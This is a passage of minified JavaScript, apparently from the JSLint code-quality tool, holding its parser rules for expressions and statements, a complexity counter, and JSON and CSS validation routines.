return this;},'boolean');prefix('typeof',null,'string');prefix('new',function(){one_space();var c=expression(160),i,p,v;this.first=c;if(c.id!=='function'){if(c.identifier){switch(c.value){case'Object':warn('use_object',token);break;case'Array':if(next_token.id==='('){p=next_token;p.first=this;advance('(');if(next_token.id!==')'){p.second=expression(0);if(p.second.id!=='(string)'||!p.second.value){expected_condition(p.second,bundle.use_array);i=false;}else{i=true;}
while(next_token.id!==')'&&next_token.id!=='(end)'){if(i){warn('use_array',p);i=false;}
advance();}}else{warn('use_array',token);}
advance(')',p);discard();return p;}
warn('use_array',token);break;case'Number':case'String':case'Boolean':case'Math':case'JSON':warn('not_a_constructor',c);break;case'Function':if(!option.evil){warn('function_eval');}
break;case'Date':case'RegExp':break;default:if(c.id!=='function'){v=c.value.charAt(0);if(!option.newcap&&(v<'A'||v>'Z')){warn('constructor_name_a',token);}}}}else{if(c.id!=='.'&&c.id!=='['&&c.id!=='('){warn('bad_constructor',token);}}}else{warn('weird_new',this);}
if(next_token.id!=='('){warn('missing_a',next_token,'()');}
return this;});infix('(',160,function(left,that){if(indent&&indent.mode==='expression'){no_space(prev_token,token);}else{no_space_only(prev_token,token);}
if(!left.immed&&left.id==='function'){warn('wrap_immediate');}
var p=[];if(left){conform_type('function',left);if(left.identifier){if(left.value.match(/^[A-Z]([A-Z0-9_$]*[a-z][A-Za-z0-9_$]*)?$/)){if(left.value!=='Number'&&left.value!=='String'&&left.value!=='Boolean'&&left.value!=='Date'){if(left.value==='Math'||left.value==='JSON'){warn('not_a_function',left);}else if(left.value==='Object'){warn('use_object',token);}else if(left.value==='Array'||!option.newcap){warn('missing_a',left,'new');}}}}else if(left.id==='.'){if(option.safe&&left.first.value==='Math'&&left.second==='random'){warn('adsafe',left);}else if(left.second.value==='split'&&left.first.id==='(string)'){warn('use_array',left.second);}}}
step_in();if(next_token.id!==')'){no_space();for(;;){edge();p.push(expression(10));if(next_token.id!==','){break;}
comma();}}
no_space();step_out(')',that);if(typeof left==='object'){if(left.value==='parseInt'&&p.length===1){warn('radix',left);}
if(!option.evil){if(left.value==='eval'||left.value==='Function'||left.value==='execScript'){warn('evil',left);}else if(p[0]&&p[0].id==='(string)'&&(left.value==='setTimeout'||left.value==='setInterval')){warn('implied_evil',left);}}
if(!left.identifier&&left.id!=='.'&&left.id!=='['&&left.id!=='('&&left.id!=='&&'&&left.id!=='||'&&left.id!=='?'){warn('bad_invocation',left);}}
that.first=left;that.second=p;if(!option.type){if(left.id==='.'){if(left.second.value==='charAt'||left.second.value==='substring'){conform_type('string',that);conform_type('string',left.first);p.forEach(function(value){conform_type('number',value);});}else if(left.second.value==='toString'||left.second.value==='stringify'){conform_type('string',that);}}else if(left.identifier){if(left.value==='String'){conform_type('string',that);}}}
return that;},'',true);prefix('(',function(){step_in('expression');discard();no_space();edge();if(next_token.id==='function'){next_token.immed=true;}
var value=expression(0);value.paren=true;no_space();step_out(')',this);discard();if(value.id==='function'){if(next_token.id==='('){warn('move_invocation');}else{warn('bad_wrap',this);}}
return value;});infix('.',170,function(left,that){no_space(prev_token,token);no_space();var name=identifier();if(typeof name==='string'){tally_property(name);}
that.first=left;that.second=token;if(left&&left.value==='arguments'&&(name==='callee'||name==='caller')){warn('avoid_a',left,'arguments.'+name);}else if(!option.evil&&left&&left.value==='document'&&(name==='write'||name==='writeln')){warn('write_is_wrong',left);}else if(option.adsafe){if(!adsafe_top&&left.value==='ADSAFE'){if(name==='id'||name==='lib'){warn('adsafe',that);}else if(name==='go'){if(xmode!=='script'){warn('adsafe',that);}else if(adsafe_went||next_token.id!=='('||peek(0).id!=='(string)'||peek(0).value!==adsafe_id||peek(1).id!==','){stop('adsafe_a',that,'go');}
adsafe_went=true;adsafe_may=false;}}
adsafe_top=false;}
if(!option.evil&&(name==='eval'||name==='execScript')){warn('evil');}else if(option.safe){for(;;){if(banned[name]===true){warn('adsafe_a',token,name);}
if(typeof predefined[left.value]!=='boolean'||next_token.id==='('){break;}
if(standard_property[name]===true){if(next_token.id==='.'){warn('adsafe',that);}
break;}
if(next_token.id!=='.'){warn('adsafe',that);break;}
advance('.');token.first=that;token.second=name;that=token;name=identifier();if(typeof name==='string'){tally_property(name);}}}
if(name==='length'){conform_type('number',that);}
return that;},'',true);infix('[',170,function(left,that){var left_type=get_type(left),e,s;no_space_only(prev_token,token);no_space();step_in();edge();e=expression(0);switch(get_type(e)){case'number':if(e.id==='(number)'&&left.id==='arguments'){warn('use_param',left);}
if(!left_type){conform_type('array',left);}
break;case'string':if(e.id==='(string)'){if(option.safe&&(banned[e.value]||e.value.charAt(0)==='_'||e.value.slice(-1)==='_')){warn('adsafe_subscript_a',e);}else if(!option.evil&&(e.value==='eval'||e.value==='execScript')){warn('evil',e);}else if(!option.sub&&ix.test(e.value)){s=syntax[e.value];if(!s||!s.reserved){warn('subscript',e);}}
tally_property(e.value);}else if(option.safe&&e.id!=='typeof'){warn('adsafe_subscript_a',e);}
conform_type('object',left);break;case undefined:switch(get_type(left)){case'array':conform_type('number',e);break;case'object':conform_type('string',e);break;case'string':if(!option.type){warn('use_charAt',that);}
that.type='string';break;}
if(option.safe){warn('adsafe_subscript_a',e);}
break;default:if(option.safe){warn('adsafe_subscript_a',e);}else{warn('bad_type');}}
step_out(']',that);discard();no_space(prev_token,token);that.first=left;that.second=e;return that;},'',true);prefix('[',function(){this.arity='prefix';this.first=[];this.type='array';step_in('array');while(next_token.id!=='(end)'){while(next_token.id===','){warn('unexpected_a',next_token);advance(',');discard();}
if(next_token.id===']'){break;}
indent.wrap=false;edge();this.first.push(expression(10));if(next_token.id===','){comma();if(next_token.id===']'&&!option.es5){warn('unexpected_a',token);break;}}else{break;}}
step_out(']',this);discard();return this;},170);function property_name(){var id=optional_identifier(true);if(!id){if(next_token.id==='(string)'){id=next_token.value;if(option.safe){if(banned[id]){warn('adsafe_a');}else if(id.charAt(0)==='_'||id.charAt(id.length-1)==='_'){warn('dangling_a');}}
advance();}else if(next_token.id==='(number)'){id=next_token.value.toString();advance();}}
return id;}
function function_params(){var id,paren=next_token,params=[];advance('(');step_in();discard();no_space();if(next_token.id===')'){no_space();step_out(')',paren);discard();return;}
for(;;){edge();id=identifier();params.push(token);add_label(token,option.unparam?'parameter':'unparam');if(next_token.id===','){comma();}else{no_space();step_out(')',paren);discard();return params;}}}
function complexity(exp){var score=0;if(exp){if(Array.isArray(exp)){exp.forEach(function(tok){score+=complexity(tok);});}else{switch(exp.arity){case'statement':switch(exp.id){case'if':score+=complexity(exp.first)+complexity(exp.block)+
complexity(exp['else'])+1;break;case'while':case'do':if(exp.first.id!=='true'&&exp.first.value!==1){score+=1;}
score+=complexity(exp.first)+complexity(exp.block);break;case'for':if(exp.second!==undefined&&exp.second.id!=='true'&&exp.second.value!==1){score+=1;}
score+=complexity(exp.first)+complexity(exp.second)+
complexity(exp.third)+complexity(exp.block);break;case'switch':score+=complexity(exp.first)+
complexity(exp.second)+exp.second.length;if(exp.second[exp.second.length-1].id==='default'){score-=1;}
break;case'try':if(exp.second){score+=1;}
if(exp.third){score+=1;}
score+=complexity(exp.first)+complexity(exp.second)+
complexity(exp.third)+complexity(exp.block);break;}
break;case'prefix':score+=complexity(exp.first);break;case'case':case'infix':score+=complexity(exp.first)+complexity(exp.second);if(exp.id==='&&'||exp.id==='||'){score+=1;}
break;case'ternary':score+=complexity(exp.first)+complexity(exp.second)+complexity(exp.third);break;}}}
return score;}
function do_function(func,name){var old_funct=funct,old_option=option,old_properties=properties,old_scope=scope;funct={'(name)':name||'\''+(anonname||'').replace(nx,sanitize)+'\'','(line)':next_token.line,'(context)':old_funct,'(breakage)':0,'(loopage)':0,'(scope)':scope,'(token)':func};properties=old_properties&&Object.create(old_properties);option=Object.create(old_option);scope=Object.create(old_scope);functions.push(funct);func.name=name;if(name){add_label(func,'function',name);}
func.writeable=false;func.first=funct['(params)']=function_params();func.type='function';one_space();func.block=block(false);funct['(complexity)']=complexity(func.block)+1;funct=old_funct;option=old_option;properties=old_properties;scope=old_scope;}
assignop('=');assignop('+=','+');assignop('-=','-');assignop('*=','*');assignop('/=','/').nud=function(){stop('slash_equal');};assignop('%=','%');assignop('&=','&');assignop('|=','|');assignop('^=','^');assignop('<<=','<<');assignop('>>=','>>');assignop('>>>=','>>>');prefix('{',function(){var get,i,j,name,p,set,seen={};this.arity='prefix';this.first=[];this.type='object';step_in();while(next_token.id!=='}'){indent.wrap=false;edge();if(next_token.value==='get'&&peek().id!==':'){if(!option.es5){warn('es5');}
get=next_token;advance('get');one_space_only();name=next_token;i=property_name();if(!i){stop('missing_property');}
get.value='';do_function(get);if(funct['(loopage)']){warn('function_loop',get);}
p=get.first;if(p){warn('parameter_a_get_b',p[0],p[0].value,i);}
comma();set=next_token;set.value='';spaces();edge();advance('set');one_space_only();j=property_name();if(i!==j){stop('expected_a_b',token,i,j||next_token.value);}
do_function(set);p=set.first;if(!p||p.length!==1){stop('parameter_set_a',set,'value');}else if(p[0].value!=='value'){stop('expected_a_b',p[0],'value',p[0].value);}
name.first=[get,set];}else{name=next_token;i=property_name();if(typeof i!=='string'){stop('missing_property');}
advance(':');discard();spaces();name.first=expression(10);}
this.first.push(name);if(seen[i]===true){warn('duplicate_a',next_token,i);}
seen[i]=true;tally_property(i);if(next_token.id!==','){break;}
for(;;){comma();if(next_token.id!==','){break;}
warn('unexpected_a',next_token);}
if(next_token.id==='}'&&!option.es5){warn('unexpected_a',token);}}
step_out('}',this);discard();return this;});stmt('{',function(){discard();warn('statement_block');this.arity='statement';this.block=statements();this.disrupt=this.block.disrupt;advance('}',this);discard();return this;});stmt('/*global',directive);stmt('/*globals',directive);stmt('/*jslint',directive);stmt('/*member',directive);stmt('/*members',directive);stmt('/*property',directive);stmt('/*properties',directive);stmt('var',function(){var assign,id,name;if(funct['(vars)']&&!option.vars){warn('combine_var');}else if(funct!==global_funct){funct['(vars)']=true;}
this.arity='statement';this.first=[];step_in('var');for(;;){name=next_token;id=identifier();add_label(name,'becoming');if(next_token.id==='='){assign=next_token;assign.first=name;spaces();advance('=');spaces();if(next_token.id==='undefined'){warn('unnecessary_initialize',token,id);}
if(peek(0).id==='='&&next_token.identifier){stop('var_a_not');}
assign.second=expression(0);assign.arity='infix';this.first.push(assign);if(assign.second.type){name.type=assign.second.type;}}else{this.first.push(name);}
if(funct[id]==='becoming'){funct[id]='unused';}
if(next_token.id!==','){break;}
comma();indent.wrap=false;if(var_mode&&next_token.line===token.line&&this.first.length===1){var_mode=null;indent.open=false;indent.at-=option.indent;}
spaces();edge();}
var_mode=null;step_out();return this;});stmt('function',function(){one_space();if(in_block){warn('function_block',token);}
var name=next_token,id=identifier();add_label(name,'unction');no_space();do_function(this,id);if(next_token.id==='('&&next_token.line===token.line){stop('function_statement');}
this.arity='statement';return this;});prefix('function',function(){one_space();var id=optional_identifier();if(id){no_space();}else{id='';}
do_function(this,id);if(funct['(loopage)']){warn('function_loop');}
this.arity='function';return this;});stmt('if',function(){var paren=next_token;one_space();advance('(');step_in('control');discard();no_space();edge();this.arity='statement';this.first=expected_condition(expected_relation(expression(0)));no_space();step_out(')',paren);discard();one_space();this.block=block(true);if(next_token.id==='else'){one_space();advance('else');discard();one_space();this['else']=next_token.id==='if'||next_token.id==='switch'?statement(true):block(true);if(this['else'].disrupt&&this.block.disrupt){this.disrupt=true;}}
return this;});stmt('try',function(){var exception_variable,old_scope,paren;if(option.adsafe){warn('adsafe_a',this);}
one_space();this.arity='statement';this.block=block(false);if(next_token.id==='catch'){one_space();advance('catch');discard();one_space();paren=next_token;advance('(');step_in('control');discard();no_space();edge();old_scope=scope;scope=Object.create(old_scope);exception_variable=next_token.value;this.first=exception_variable;if(!next_token.identifier){warn('expected_identifier_a',next_token);}else{add_label(next_token,'exception');}
advance();no_space();step_out(')',paren);discard();one_space();this.second=block(false);scope=old_scope;}
if(next_token.id==='finally'){discard();one_space();advance('finally');discard();one_space();this.third=block(false);}else if(!this.second){stop('expected_a_b',next_token,'catch',next_token.value);}
return this;});labeled_stmt('while',function(){one_space();var paren=next_token;funct['(breakage)']+=1;funct['(loopage)']+=1;advance('(');step_in('control');discard();no_space();edge();this.arity='statement';this.first=expected_relation(expression(0));if(this.first.id!=='true'){expected_condition(this.first,bundle.unexpected_a);}
no_space();step_out(')',paren);discard();one_space();this.block=block(true);if(this.block.disrupt){warn('strange_loop',prev_token);}
funct['(breakage)']-=1;funct['(loopage)']-=1;return this;});reserve('with');labeled_stmt('switch',function(){var particular,the_case=next_token,unbroken=true;funct['(breakage)']+=1;one_space();advance('(');discard();no_space();step_in();this.arity='statement';this.first=expected_condition(expected_relation(expression(0)));no_space();step_out(')',the_case);discard();one_space();advance('{');step_in();this.second=[];while(next_token.id==='case'){the_case=next_token;the_case.first=[];the_case.arity='case';spaces();edge('case');advance('case');for(;;){one_space();particular=expression(0);the_case.first.push(particular);if(particular.id==='NaN'){warn('unexpected_a',particular);}
no_space_only();advance(':');discard();if(next_token.id!=='case'){break;}
spaces();edge('case');advance('case');discard();}
spaces();the_case.second=statements();if(the_case.second&&the_case.second.length>0){particular=the_case.second[the_case.second.length-1];if(particular.disrupt){if(particular.id==='break'){unbroken=false;}}else{warn('missing_a_after_b',next_token,'break','case');}}else{warn('empty_case');}
this.second.push(the_case);}
if(this.second.length===0){warn('missing_a',next_token,'case');}
if(next_token.id==='default'){spaces();the_case=next_token;the_case.arity='case';edge('case');advance('default');discard();no_space_only();advance(':');discard();spaces();the_case.second=statements();if(the_case.second&&the_case.second.length>0){particular=the_case.second[the_case.second.length-1];if(unbroken&&particular.disrupt&&particular.id!=='break'){this.disrupt=true;}}
this.second.push(the_case);}
funct['(breakage)']-=1;spaces();step_out('}',this);return this;});stmt('debugger',function(){if(!option.debug){warn('unexpected_a',this);}
this.arity='statement';return this;});labeled_stmt('do',function(){funct['(breakage)']+=1;funct['(loopage)']+=1;one_space();this.arity='statement';this.block=block(true);if(this.block.disrupt){warn('strange_loop',prev_token);}
one_space();advance('while');discard();var paren=next_token;one_space();advance('(');step_in();discard();no_space();edge();this.first=expected_condition(expected_relation(expression(0)),bundle.unexpected_a);no_space();step_out(')',paren);discard();funct['(breakage)']-=1;funct['(loopage)']-=1;return this;});labeled_stmt('for',function(){var blok,filter,ok=false,paren=next_token,the_in,value;this.arity='statement';funct['(breakage)']+=1;funct['(loopage)']+=1;advance('(');step_in('control');discard();spaces(this,paren);no_space();if(next_token.id==='var'){stop('move_var');}
edge();if(peek(0).id==='in'){value=next_token;switch(funct[value.value]){case'unused':funct[value.value]='var';break;case'closure':case'var':break;default:warn('bad_in_a',value);}
conform_type('string',value);advance();the_in=next_token;advance('in');the_in.first=value;the_in.second=expression(20);conform_type('object',the_in.second);step_out(')',paren);discard();this.first=the_in;blok=block(true);if(!option.forin){if(blok.length===1&&typeof blok[0]==='object'&&blok[0].value==='if'&&!blok[0]['else']){filter=blok[0].first;while(filter.id==='&&'){filter=filter.first;}
switch(filter.id){case'===':case'!==':ok=filter.first.id==='['?(filter.first.first.value===the_in.second.value&&filter.first.second.value===the_in.first.value):(filter.first.id==='typeof'&&filter.first.first.id==='['&&filter.first.first.first.value===the_in.second.value&&filter.first.first.second.value===the_in.first.value);break;case'(':ok=filter.first.id==='.'&&((filter.first.first.value===the_in.second.value&&filter.first.second.value==='hasOwnProperty'&&filter.second[0].value===the_in.first.value)||(filter.first.first.value==='ADSAFE'&&filter.first.second.value==='has'&&filter.second[0].value===the_in.second.value&&filter.second[1].value===the_in.first.value)||(filter.first.first.id==='.'&&filter.first.first.first.id==='.'&&filter.first.first.first.first.value==='Object'&&filter.first.first.first.second.value==='prototype'&&filter.first.first.second.value==='hasOwnProperty'&&filter.first.second.value==='call'&&filter.second[0].value===the_in.second.value&&filter.second[1].value===the_in.first.value));break;}}
if(!ok){warn('for_if',this);}}}else{if(next_token.id!==';'){edge();this.first=[];for(;;){this.first.push(expression(0,'for'));if(next_token.id!==','){break;}
comma();}}
semicolon();if(next_token.id!==';'){edge();this.second=expected_relation(expression(0));if(this.second.id!=='true'){expected_condition(this.second,bundle.unexpected_a);}}
semicolon(token);if(next_token.id===';'){stop('expected_a_b',next_token,')',';');}
if(next_token.id!==')'){this.third=[];edge();for(;;){this.third.push(expression(0,'for'));if(next_token.id!==','){break;}
comma();}}
no_space();step_out(')',paren);discard();one_space();blok=block(true);}
if(blok.disrupt){warn('strange_loop',prev_token);}
this.block=blok;funct['(breakage)']-=1;funct['(loopage)']-=1;return this;});disrupt_stmt('break',function(){var label=next_token.value;this.arity='statement';if(funct['(breakage)']===0){warn('unexpected_a',this);}
if(next_token.identifier&&token.line===next_token.line){one_space_only();if(funct[label]!=='label'){warn('not_a_label',next_token);}else if(scope[label].funct!==funct){warn('not_a_scope',next_token);}
this.first=next_token;advance();}
return this;});disrupt_stmt('continue',function(){if(!option['continue']){warn('unexpected_a',this);}
var label=next_token.value;this.arity='statement';if(funct['(breakage)']===0){warn('unexpected_a',this);}
if(next_token.identifier&&token.line===next_token.line){one_space_only();if(funct[label]!=='label'){warn('not_a_label',next_token);}else if(scope[label].funct!==funct){warn('not_a_scope',next_token);}
this.first=next_token;advance();}
return this;});disrupt_stmt('return',function(){this.arity='statement';if(next_token.id!==';'&&next_token.line===token.line){one_space_only();if(next_token.id==='/'||next_token.id==='(regexp)'){warn('wrap_regexp');}
this.first=expression(20);}
return this;});disrupt_stmt('throw',function(){this.arity='statement';one_space_only();this.first=expression(20);return this;});reserve('class');reserve('const');reserve('enum');reserve('export');reserve('extends');reserve('import');reserve('super');reserve('let');reserve('yield');reserve('implements');reserve('interface');reserve('package');reserve('private');reserve('protected');reserve('public');reserve('static');function json_value(){function json_object(){var brace=next_token,object={};advance('{');if(next_token.id!=='}'){while(next_token.id!=='(end)'){while(next_token.id===','){warn('unexpected_a',next_token);comma();}
if(next_token.id!=='(string)'){warn('expected_string_a');}
if(object[next_token.value]===true){warn('duplicate_a');}else if(next_token.value==='__proto__'){warn('dangling_a');}else{object[next_token.value]=true;}
advance();advance(':');json_value();if(next_token.id!==','){break;}
comma();if(next_token.id==='}'){warn('unexpected_a',token);break;}}}
advance('}',brace);}
function json_array(){var bracket=next_token;advance('[');if(next_token.id!==']'){while(next_token.id!=='(end)'){while(next_token.id===','){warn('unexpected_a',next_token);comma();}
json_value();if(next_token.id!==','){break;}
comma();if(next_token.id===']'){warn('unexpected_a',token);break;}}}
advance(']',bracket);}
switch(next_token.id){case'{':json_object();break;case'[':json_array();break;case'true':case'false':case'null':case'(number)':case'(string)':advance();break;case'-':advance('-');no_space_only();advance('(number)');break;default:stop('unexpected_a');}}
function css_name(){if(next_token.identifier){advance();return true;}}
function css_number(){if(next_token.id==='-'){advance('-');no_space_only();}
if(next_token.id==='(number)'){advance('(number)');return true;}}
function css_string(){if(next_token.id==='(string)'){advance();return true;}}
function css_color(){var i,number,paren,value;if(next_token.identifier){value=next_token.value;if(value==='rgb'||value==='rgba'){advance();paren=next_token;advance('(');for(i=0;i<3;i+=1){if(i){comma();}
number=next_token.value;if(next_token.id!=='(string)'||number<0){warn('expected_positive_a',next_token);advance();}else{advance();if(next_token.id==='%'){advance('%');if(number>100){warn('expected_percent_a',token,number);}}else{if(number>255){warn('expected_small_a',token,number);}}}}
if(value==='rgba'){comma();number=+next_token.value;if(next_token.id!=='(string)'||number<0||number>1){warn('expected_fraction_a',next_token);}
advance();if(next_token.id==='%'){warn('unexpected_a');advance('%');}}
advance(')',paren);return true;}else if(css_colorData[next_token.value]===true){advance();return true;}}else if(next_token.id==='(color)'){advance();return true;}
return false;}
function css_length(){if(next_token.id==='-'){advance('-');no_space_only();}
if(next_token.id==='(number)'){advance();if(next_token.id!=='(string)'&&css_lengthData[next_token.value]===true){no_space_only();advance();}else if(+token.value!==0){warn('expected_linear_a');}
return true;}
return false;}
function css_line_height(){if(next_token.id==='-'){advance('-');no_space_only();}
if(next_token.id==='(number)'){advance();if(next_token.id!=='(string)'&&css_lengthData[next_token.value]===true){no_space_only();advance();}
return true;}
return false;}
function css_width(){if(next_token.identifier){switch(next_token.value){case'thin':case'medium':case'thick':advance();return true;}}else{return css_length();}}
function css_margin(){if(next_token.identifier){if(next_token.value==='auto'){advance();return true;}}else{return css_length();}}
function css_attr(){if(next_token.identifier&&next_token.value==='attr'){advance();advance('(');if(!next_token.identifier){warn('expected_name_a');}
advance();advance(')');return true;}
return false;}
function css_comma_list(){while(next_token.id!==';'){if(!css_name()&&!css_string()){warn('expected_name_a');}
if(next_token.id!==','){return true;}
comma();}}
function css_counter(){if(next_token.identifier&&next_token.value==='counter'){advance();advance('(');advance();if(next_token.id===','){comma();if(next_token.id!=='(string)'){warn('expected_string_a');}
advance();}
advance(')');return true;}
if(next_token.identifier&&next_token.value==='counters'){advance();advance('(');if(!next_token.identifier){warn('expected_name_a');}
advance();if(next_token.id===','){comma();if(next_token.id!=='(string)'){warn('expected_string_a');}
advance();}
if(next_token.id===','){comma();if(next_token.id!=='(string)'){warn('expected_string_a');}
advance();}
advance(')');return true;}
return false;}
function css_shape(){var i;if(next_token.identifier&&next_token.value==='rect'){advance();advance('(');for(i=0;i<4;i+=1){if(!css_length()){warn('expected_number_a');break;}}
advance(')');return true;}
return false;}
function css_url(){var c,url;if(next_token.identifier&&next_token.value==='url'){next_token=lex.range('(',')');url=next_token.value;c=url.charAt(0);if(c==='"'||c==='\''){if(url.slice(-1)!==c){warn('bad_url');}else{url=url.slice(1,-1);if(url.indexOf(c)>=0){warn('bad_url');}}}
if(!url){warn('missing_url');}
if(option.safe&&ux.test(url)){stop('adsafe_a',next_token,url);}
urls.push(url);advance();return true;}
return false;}
css_any=[css_url,function(){for(;;){if(next_token.identifier){switch(next_token.value.toLowerCase()){case'url':css_url();break;case'expression':warn('unexpected_a');advance();break;default:advance();}}else{if(next_token.id===';'||next_token.id==='!'||next_token.id==='(end)'||next_token.id==='}'){return true;}
advance();}}}];css_border_style=['none','dashed','dotted','double','groove','hidden','inset','outset','ridge','solid'];css_break=['auto','always','avoid','left','right'];css_media={'all':true,'braille':true,'embossed':true,'handheld':true,'print':true,'projection':true,'screen':true,'speech':true,'tty':true,'tv':true};css_overflow=['auto','hidden','scroll','visible'];css_attribute_data={background:[true,'background-attachment','background-color','background-image','background-position','background-repeat'],'background-attachment':['scroll','fixed'],'background-color':['transparent',css_color],'background-image':['none',css_url],'background-position':[2,[css_length,'top','bottom','left','right','center']],'background-repeat':['repeat','repeat-x','repeat-y','no-repeat'],'border':[true,'border-color','border-style','border-width'],'border-bottom':[true,'border-bottom-color','border-bottom-style','border-bottom-width'],'border-bottom-color':css_color,'border-bottom-style':css_border_style,'border-bottom-width':css_width,'border-collapse':['collapse','separate'],'border-color':['transparent',4,css_color],'border-left':[true,'border-left-color','border-left-style','border-left-width'],'border-left-color':css_color,'border-left-style':css_border_style,'border-left-width':css_width,'border-right':[true,'border-right-color','border-right-style','border-right-width'],'border-right-color':css_color,'border-right-style':css_border_style,'border-right-width':css_width,'border-spacing':[2,css_length],'border-style':[4,css_border_style],'border-top':[true,'border-top-color','border-top-style','border-top-width'],'border-top-color':css_color,'border-top-style':css_border_style,'border-top-width':css_width,'border-width':[4,css_width],bottom:[css_length,'auto'],'caption-side':['bottom','left','right','top'],clear:['both','left','none','right'],clip:[css_shape,'auto'],color:css_color,content:['open-quote','close-quote','no-open-quote','no-close-quote',css_string,css_url,css_counter,css_attr],'counter-increment':[css_name,'none'],'counter-reset':[css_name,'none'],cursor:[css_url,'auto','crosshair','default','e-resize','help','move','n-resize','ne-resize','nw-resize','pointer','s-resize','se-resize','sw-resize','w-resize','text','wait'],direction:['ltr','rtl'],display:['block','compact','inline','inline-block','inline-table','list-item','marker','none','run-in','table','table-caption','table-cell','table-column','table-column-group','table-footer-group','table-header-group','table-row','table-row-group'],'empty-cells':['show','hide'],'float':['left','none','right'],font:['caption','icon','menu','message-box','small-caption','status-bar',true,'font-size','font-style','font-weight','font-family'],'font-family':css_comma_list,'font-size':['xx-small','x-small','small','medium','large','x-large','xx-large','larger','smaller',css_length],'font-size-adjust':['none',css_number],'font-stretch':['normal','wider','narrower','ultra-condensed','extra-condensed','condensed','semi-condensed','semi-expanded','expanded','extra-expanded'],'font-style':['normal','italic','oblique'],'font-variant':['normal','small-caps'],'font-weight':['normal','bold','bolder','lighter',css_number],height:[css_length,'auto'],left:[css_length,'auto'],'letter-spacing':['normal',css_length],'line-height':['normal',css_line_height],'list-style':[true,'list-style-image','list-style-position','list-style-type'],'list-style-image':['none',css_url],'list-style-position':['inside','outside'],'list-style-type':['circle','disc','square','decimal','decimal-leading-zero','lower-roman','upper-roman','lower-greek','lower-alpha','lower-latin','upper-alpha','upper-latin','hebrew','katakana','hiragana-iroha','katakana-oroha','none'],margin:[4,css_margin],'margin-bottom':css_margin,'margin-left':css_margin,'margin-right':css_margin,'margin-top':css_margin,'marker-offset':[css_length,'auto'],'max-height':[css_length,'none'],'max-width':[css_length,'none'],'min-height':css_length,'min-width':css_length,opacity:css_number,outline:[true,'outline-color','outline-style','outline-width'],'outline-color':['invert',css_color],'outline-style':['dashed','dotted','double','groove','inset','none','outset','ridge','solid'],'outline-width':css_width,overflow:css_overflow,'overflow-x':css_overflow,'overflow-y':css_overflow,padding:[4,css_length],'padding-bottom':css_length,'padding-left':css_length,'padding-right':css_length,'padding-top':css_length,'page-break-after':css_break,'page-break-before':css_break,position:['absolute','fixed','relative','static'],quotes:[8,css_string],right:[css_length,'auto'],'table-layout':['auto','fixed'],'text-align':['center','justify','left','right'],'text-decoration':['none','underline','overline','line-through','blink'],'text-indent':css_length,'text-shadow':['none',4,[css_color,css_length]],'text-transform':['capitalize','uppercase','lowercase','none'],top:[css_length,'auto'],'unicode-bidi':['normal','embed','bidi-override'],'vertical-align':['baseline','bottom','sub','super','top','text-top','middle','text-bottom',css_length],visibility:['visible','hidden','collapse'],'white-space':['normal','nowrap','pre','pre-line','pre-wrap','inherit'],width:[css_length,'auto'],'word-spacing':['normal',css_length],'word-wrap':['break-word','normal'],'z-index':['auto',css_number]};function style_attribute(){var v;while(next_token.id==='*'||next_token.id==='#'||next_token.value==='_'){if(!option.css){warn('unexpected_a');}
advance();}
if(next_token.id==='-'){if(!option.css){warn('unexpected_a');}
advance('-');if(!next_token.identifier){warn('expected_nonstandard_style_attribute');}
advance();return css_any;}else{if(!next_token.identifier){warn('expected_style_attribute');}else{if(Object.prototype.hasOwnProperty.call(css_attribute_data,next_token.value)){v=css_attribute_data[next_token.value];}else{v=css_any;if(!option.css){warn('unrecognized_style_attribute_a');}}}
advance();return v;}}
function style_value(v){var i=0,n,once,match,round,start=0,vi;switch(typeof v){case'function':return v();case'string':if(next_token.identifier&&next_token.value===v){advance();return true;}
return false;}
for(;;){if(i>=v.length){return false;}
vi=v[i];i+=1;if(typeof vi==='boolean'){break;}else if(typeof vi==='number'){n=vi;vi=v[i];i+=1;}else{n=1;}
match=false;while(n>0){if(style_value(vi)){match=true;n-=1;}else{break;}}
if(match){return true;}}
start=i;once=[];for(;;){round=false;for(i=start;i<v.length;i+=1){if(!once[i]){if(style_value(css_attribute_data[v[i]])){match=true;round=true;once[i]=true;break;}}}
if(!round){return match;}}}
function style_child(){if(next_token.id==='(number)'){advance();if(next_token.value==='n'&&next_token.identifier){no_space_only();advance();if(next_token.id==='+'){no_space_only();advance('+');no_space_only();advance('(number)');}}
return;}else{if(next_token.identifier&&(next_token.value==='odd'||next_token.value==='even')){advance();return;}}
warn('unexpected_a');}
function substyle(){var v;for(;;){if(next_token.id==='}'||next_token.id==='(end)'||(xquote&&next_token.id===xquote)){return;}
while(next_token.id===';'){warn('unexpected_a');semicolon();}
v=style_attribute();advance(':');if(next_token.identifier&&next_token.value==='inherit'){advance();}else{if(!style_value(v)){warn('unexpected_a');advance();}}
if(next_token.id==='!'){advance('!');no_space_only();if(next_token.identifier&&next_token.value==='important'){advance();}else{warn('expected_a_b',next_token,'important',next_token.value);}}
if(next_token.id==='}'||next_token.id===xquote){warn('expected_a_b',next_token,';',next_token.value);}else{semicolon();}}}
function style_selector(){if(next_token.identifier){if(!Object.prototype.hasOwnProperty.call(html_tag,option.cap?next_token.value.toLowerCase():next_token.value)){warn('expected_tagname_a');}
advance();}else{switch(next_token.id){case'>':case'+':advance();style_selector();break;case':':advance(':');switch(next_token.value){case'active':case'after':case'before':case'checked':case'disabled':case'empty':case'enabled':case'first-child':case'first-letter':case'first-line':case'first-of-type':case'focus':case'hover':case'last-child':case'last-of-type':case'link':case'only-of-type':case'root':case'target':case'visited':advance();break;case'lang':advance();advance('(');if(!next_token.identifier){warn('expected_lang_a');}
advance(')');break;case'nth-child':case'nth-last-child':case'nth-last-of-type':case'nth-of-type':advance();advance('(');style_child();advance(')');break;case'not':advance();advance('(');if(next_token.id===':'&&peek(0).value==='not'){warn('not');}
style_selector();advance(')');break;default:warn('expected_pseudo_a');}
break;case'#':advance('#');if(!next_token.identifier){warn('expected_id_a');}
advance();break;case'*':advance('*');break;case'.':advance('.');if(!next_token.identifier){warn('expected_class_a');}
advance();break;case'[':advance('[');if(!next_token.identifier){warn('expected_attribute_a');}
advance();if(next_token.id==='='||next_token.value==='~='||next_token.value==='$='||next_token.value==='|='||next_token.id==='*='||next_token.id==='^='){advance();if(next_token.id!=='(string)'){warn('expected_string_a');}
advance();}
advance(']');break;default:stop('expected_selector_a');}}}
function style_pattern(){if(next_token.id==='{'){warn('expected_style_pattern');}
for(;;){style_selector();if(next_token.id==='</'||next_token.id==='{'||next_token.id==='(end)'){return'';}
if(next_token.id===','){comma();}}}
